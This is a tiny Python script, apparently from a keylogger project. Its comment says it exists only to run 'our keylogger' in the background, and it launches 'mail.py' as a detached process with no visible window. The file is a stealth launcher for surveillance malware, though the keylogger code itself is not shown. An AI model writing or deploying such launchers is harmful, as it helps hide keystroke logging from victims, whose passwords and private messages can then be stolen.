import subprocess

# All this file does is run our keylogger as a background process
sp = subprocess.Popen(['python', 'mail.py'], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)